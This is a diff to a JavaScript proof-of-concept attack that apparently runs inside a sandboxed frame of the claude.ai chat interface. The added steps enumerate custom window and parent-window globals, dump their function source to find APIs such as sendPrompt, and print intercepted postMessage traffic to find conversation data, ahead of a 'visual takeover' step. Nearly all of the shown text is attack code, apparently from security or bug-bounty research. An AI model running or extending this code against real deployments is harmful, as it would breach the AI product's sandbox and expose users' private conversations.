@@ -188,6 +188,74 @@ async function poc() {
     console.log(`[${m.method || 'response'}]`, m.data);
   }
 
+  // 9. Enumerate ALL custom globals on window (looking for more APIs like sendPrompt)
+  console.log("[9] Scanning for custom window APIs...");
+  try {
+    // Get all properties that aren't standard browser APIs
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+    const standardKeys = new Set(Object.getOwnPropertyNames(iframe.contentWindow));
+    iframe.remove();
+
+    const customKeys = Object.getOwnPropertyNames(window).filter(k => !standardKeys.has(k));
+    console.log("[9] Custom window properties:", customKeys);
+
+    for (const key of customKeys) {
+      try {
+        const val = window[key];
+        const type = typeof val;
+        if (type === 'function') {
+          console.log(`  window.${key} = [function] ${val.toString().slice(0, 200)}`);
+        } else if (type === 'object' && val !== null) {
+          const objKeys = Object.keys(val);
+          console.log(`  window.${key} = [object] keys: ${objKeys.join(', ')}`);
+          // Dive into object methods
+          for (const ok of objKeys) {
+            if (typeof val[ok] === 'function') {
+              console.log(`    window.${key}.${ok} = [function] ${val[ok].toString().slice(0, 150)}`);
+            }
+          }
+        } else {
+          console.log(`  window.${key} = [${type}] ${String(val).slice(0, 100)}`);
+        }
+      } catch(e) {
+        console.log(`  window.${key} = [error reading] ${e.message}`);
+      }
+    }
+    log('Custom window APIs', true, customKeys.join(', '));
+  } catch(e) {
+    log('Custom window APIs', false, e.message);
+  }
+
+  // 10. Check parent window for custom globals too
+  console.log("[10] Scanning parent window for custom APIs...");
+  try {
+    const parentCustom = Object.getOwnPropertyNames(window.parent).filter(k => {
+      try {
+        const val = window.parent[k];
+        return typeof val === 'function' || (typeof val === 'object' && val !== null && val !== window.parent.document && val !== window.parent.location);
+      } catch(e) { return false; }
+    });
+    console.log("[10] Parent custom properties:", parentCustom.length);
+    for (const key of parentCustom) {
+      try {
+        const val = window.parent[key];
+        if (typeof val === 'function' && !['Object','Function','Array','Number','String','Boolean','Symbol','Date','RegExp','Error','Promise','Map','Set','WeakMap','WeakSet','Proxy','Reflect','parseInt','parseFloat','isNaN','isFinite','eval','decodeURI','decodeURIComponent','encodeURI','encodeURIComponent','escape','unescape','atob','btoa','setTimeout','setInterval','clearTimeout','clearInterval','requestAnimationFrame','cancelAnimationFrame','fetch','alert','confirm','prompt','open','close','focus','blur','print','scroll','scrollTo','scrollBy','getComputedStyle','matchMedia','queueMicrotask','structuredClone','reportError','requestIdleCallback','cancelIdleCallback','createImageBitmap','postMessage','addEventListener','removeEventListener','dispatchEvent'].includes(key)) {
+          console.log(`  parent.${key} = [function] ${val.toString().slice(0, 200)}`);
+        }
+      } catch(e) {}
+    }
+  } catch(e) {
+    console.log("[10] Error:", e.message);
+  }
+
+  // 11. Check if we can listen to messages from claude.ai that contain conversation data
+  console.log("[11] Checking intercepted messages for conversation data...");
+  for (const m of intercepted) {
+    console.log(`  [intercepted] ${m.method || 'response'}: ${m.data.slice(0, 500)}`);
+  }
+
   // LAST: Visual takeover with results
   console.log("\n[FINAL] Visual takeover...");
   try {
